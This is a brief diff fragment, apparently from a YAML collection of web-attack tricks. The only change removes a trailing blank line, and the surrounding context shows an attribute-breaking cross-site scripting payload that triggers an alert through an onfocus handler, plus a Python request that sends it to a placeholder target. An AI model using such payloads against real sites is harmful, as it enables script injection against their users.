@@ -38,4 +38,3 @@ tricks:
     payload: |
       payload = '" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="'
       requests.get('http://TARGET/page', params={'name': payload})
-
